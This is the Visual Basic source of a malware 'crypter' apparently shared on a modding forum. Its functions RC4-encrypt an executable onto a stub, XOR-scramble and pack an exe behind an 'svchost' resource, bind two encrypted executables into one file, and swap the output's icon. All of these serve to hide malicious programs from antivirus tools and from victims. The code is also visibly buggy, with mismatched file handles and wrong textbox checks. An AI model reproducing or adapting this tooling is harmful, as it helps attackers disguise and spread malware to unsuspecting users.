'BlazedUp Crytper's Source
'Make Sure You Give Me Credit
'Register At ModdingQ.com For More Sources

Imports System.Text
Imports System.IO

Public Class Form1
    Const filesplit = "-{im-too-drunk-to-care}-"
    Dim F, F2 As String
    Private Sub ButtonX1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX1.Click
        Dim ofd As New OpenFileDialog
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBoxX1.Text = ofd.FileName
        Else : Exit Sub
        End If
    End Sub

    Private Sub ButtonX2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX2.Click
        Dim filein, filename, stub As String
        Dim sfd As New SaveFileDialog
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            filename = sfd.FileName
        Else : Exit Sub
        End If
        FileOpen(1, TextBoxX1.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        filein = Space(LOF(1))
        FileGet(1, filein)
        FileClose(1)
        FileOpen(3, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        FileOpen(1, filename, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & filesplit & rc4(filein, "MyBigAssDrunkenPassword"))
        FileClose(1)
        MsgBox("Crypted")
    End Sub

    Public Shared Function rc4(ByVal message As String, ByVal password As String) As String
        Dim i As Integer = 0
        Dim j As Integer = 0
        Dim cipher As New StringBuilder
        Dim returnCipher As String = String.Empty
        Dim sbox As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}
        Dim intLength As Integer = password.Length
        Dim a As Integer = 0
        While a <= 255
            Dim ctmp As Char = (password.Substring((a Mod intLength), 1).ToCharArray()(0))
            key(a) = Microsoft.VisualBasic.Strings.Asc(ctmp)
            sbox(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        Dim x As Integer = 0
        Dim b As Integer = 0
        While b <= 255
            x = (x + sbox(b) + key(b)) Mod 256
            Dim tempSwap As Integer = sbox(b)
            sbox(b) = sbox(x)
            sbox(x) = tempSwap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While
        a = 1
        While a <= message.Length
            Dim itmp As Integer = 0
            i = (i + 1) Mod 256
            j = (j + sbox(i)) Mod 256
            itmp = sbox(i)
            sbox(i) = sbox(j)
            sbox(j) = itmp
            Dim k As Integer = sbox((sbox(i) + sbox(j)) Mod 256)
            Dim ctmp As Char = message.Substring(a - 1, 1).ToCharArray()(0)
            itmp = Asc(ctmp)
            Dim cipherby As Integer = itmp Xor k
            cipher.Append(Chr(cipherby))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        returnCipher = cipher.ToString
        cipher.Length = 0
        Return returnCipher
    End Function

    Private Sub ButtonX4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX4.Click
        Dim ofd As New OpenFileDialog
        ofd.DefaultExt = "exe"
        ofd.FileName = ""
        ofd.Filter = ("Executable Files (*.exe)|*.exe")
        If ofd.ShowDialog = System.Windows.Forms.DialogResult.OK Then
            TextBoxX2.Text = ofd.FileName
        End If
    End Sub

    Private Sub ButtonX3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX3.Click
        Dim sfd As New SaveFileDialog
        sfd.DefaultExt = "exe"
        sfd.FileName = ""
        sfd.Filter = ("Executable Files (*.exe)|*.exe")
        Dim bytes() As Byte = My.Computer.FileSystem.ReadAllBytes(TextBoxX2.Text)
        ScrambleAndPack(bytes)
        If sfd.ShowDialog = System.Windows.Forms.DialogResult.OK Then
            My.Computer.FileSystem.WriteAllBytes(sfd.FileName, My.Resources.svchost, False)
            WriteResource(sfd.FileName, bytes)
        End If
        MsgBox("File Hidden", MsgBoxStyle.Information, MsgBoxStyle.Information)
    End Sub

    Private Sub ScrambleAndPack(ByRef bytes() As Byte)
        Dim rand As New Random
        Dim seed As Integer = rand.Next
        rand = New Random(seed)
        Dim entropy(bytes.Length - 1) As Byte
        rand.NextBytes(entropy)
        For i As Integer = 0 To bytes.Length - 1
            bytes(i) = bytes(i) Xor entropy(i)
        Next
        ReDim Preserve bytes(bytes.Length + 3)
        Buffer.BlockCopy(BitConverter.GetBytes(seed), 0, bytes, bytes.Length - 4, 4)
    End Sub

    Public Function ReadEOFData(ByRef FilePath As String) As String
        Dim EOFBuf As String
        Dim lPos As Integer
        If Dir(FilePath) = "" Then
            Return ""
        End If
        Dim ReadFile As String = File.ReadAllText(FilePath)
        lPos = InStr(1, StrReverse(ReadFile), GetNullBytes(30))
        EOFBuf = (Mid(StrReverse(ReadFile), 1, lPos - 1))
        ReadEOFData = StrReverse(EOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
    End Function

    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String = ""
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function

    Private Sub ButtonX6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX6.Click
        Dim ofd As New OpenFileDialog
        With ofd
            .FileName = "*.*"
            .Title = "Choose File..."
            .Filter = "Executeables (*.exe)|*.exe"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F = .SafeFileName
                TextBoxX3.Text = .SafeFileName
            End If
        End With
    End Sub

    Private Sub ButtonX5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX5.Click
        Dim ofd As New OpenFileDialog
        With ofd
            .FileName = "*.*"
            .Title = "Choose File..."
            .Filter = "Executeables (*.exe)|*.exe"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F2 = .SafeFileName
                TextBoxX4.Text = .SafeFileName

            End If
        End With
    End Sub

    Private Sub ButtonX7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX7.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .FileName = "*.*"
                .Title = "Choose File Output Folder..."
                .Filter = "Executeables (*.exe)|*.exe"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim sp As String = "[SPLITTER]"
                    Dim buffer As Byte() = My.Resources.Stub
                    My.Computer.FileSystem.WriteAllBytes(.FileName, buffer, False)
                    Dim file1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBoxX3.Text))
                    Dim file2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBoxX4.Text))

                    System.IO.File.AppendAllText(.FileName, sp & Convert.ToBase64String(file1) & sp & F & sp & Convert.ToBase64String(file2) & sp & F2)
                    MsgBox("Successfully Binded!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success!")


                End If
            End With
        Catch ex As Exception
            MsgBox("Error(s) Occured " & ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub

    Function Secure(ByVal Data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged

            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(Data, 0, Data.Length)

        End Using
    End Function
    Function UnSecure(ByVal Data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged

            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(Data, 0, Data.Length)

        End Using
    End Function

    Private Sub ButtonX9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX9.Click
        Dim OpenFileDialog1 As New OpenFileDialog
        OpenFileDialog1.DefaultExt = "exe"
        OpenFileDialog1.Filter = "Exe files (*.exe)|*.exe"
        OpenFileDialog1.FilterIndex = 1
        If OpenFileDialog1.ShowDialog(Me) = DialogResult.OK Then
            TextBoxX5.Text = String.Empty
            TextBoxX5.Text = OpenFileDialog1.FileName
        End If
    End Sub

    Private Sub ButtonX8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX8.Click
        Dim OpenFileDialog1 As New OpenFileDialog
        OpenFileDialog1.DefaultExt = "ico"
        OpenFileDialog1.Filter = "icon files (*.ico)|*.ico"
        OpenFileDialog1.FilterIndex = 1
        If OpenFileDialog1.ShowDialog(Me) = DialogResult.OK Then
            TextBoxX6.Text = String.Empty
            TextBoxX6.Text = OpenFileDialog1.FileName
        End If
    End Sub

    Private Sub Form_Unload(ByVal Cancel As Integer)
        Dim deletefile As String
        deletefile = "dissembler LIB.dll"
        If System.IO.File.Exists(deletefile) = True Then
            System.IO.File.Delete(deletefile)
        End If
    End Sub

    Private Sub ButtonX10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX10.Click
        If TextBoxX1.Text = "" Then
            MsgBox("Please Choose A File", MsgBoxStyle.Critical, "Error Changing The Icon")
        End If
        If TextBoxX2.Text = "" Then
            MsgBox("Please Choose An Icon", MsgBoxStyle.Critical, "Error Changing The Icon")
        End If
        If TextBoxX1.Text = "" Then Exit Sub

        If TextBoxX2.Text = "" Then Exit Sub

        IconInjector.InjectIcon(TextBoxX5.Text, TextBoxX6.Text)
        MsgBox("Icon Changed Successfully!", MsgBoxStyle.Information, "Success")
    End Sub

    Private Sub Form1_Closing(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Closing
        Process.Start("www.moddingq.com")
    End Sub
End Class
